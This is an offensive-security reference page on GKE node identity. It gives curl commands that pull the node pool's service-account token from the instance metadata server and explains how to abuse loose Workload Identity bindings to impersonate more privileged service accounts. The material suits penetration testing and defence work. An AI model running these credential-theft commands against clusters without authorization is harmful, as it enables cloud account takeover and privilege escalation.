---
title: "Node identity: stealing the node service account and Workload Identity"
description: "Stealing the GKE node pool's service-account token from node metadata, and abusing Workload Identity to impersonate pod service accounts."
keywords:
  - node identity
  - node service account
  - Workload Identity
  - metadata
  - kubelet
---

# Node identity

A GKE node is a Compute Engine VM, so a pod that can reach the node's **metadata server** reads the node pool's service-account token, which is frequently the default Compute Engine SA with broad project roles. Where **Workload Identity** is enabled, pods instead exchange a projected Kubernetes token for a GCP service-account token, and a loose binding lets one pod assume another workload's identity.

## Node service-account token from a pod

```bash
# from inside a pod that is not blocked from the node metadata endpoint
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
```

GKE Metadata Server (part of Workload Identity) is meant to block this node-SA path for pods; clusters without it, or with `hostNetwork` pods, still expose the raw node token.

## Workload Identity abuse

```bash
# a pod bound to a GCP SA via Workload Identity gets that SA's token from the GKE metadata server
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# if you can edit the KSA->GSA binding (iam.serviceAccounts.setIamPolicy with
# roles/iam.workloadIdentityUser), map a pod to a more privileged GSA
```

## Exploitation notes

- The node SA token is bounded by the node's OAuth scopes exactly like any [Compute Engine instance](../compute-engine/service-account-scope.md); `cloud-platform` on the node pool is the worst case.
- Workload Identity is the recommended design, but a `roles/iam.workloadIdentityUser` binding that is too broad lets you tie your pod to a privileged GSA.
- Credential retrieval mechanics are shared with [instance metadata](../../credentials/instance-metadata/index.md).

## Tools

- **curl** against the node metadata endpoint from a pod.
- **Peirates**, **kubectl** for the in-cluster steps.

## References

- [HackTricks Cloud: GCP GKE node attacks](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: GKE Workload Identity](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity)
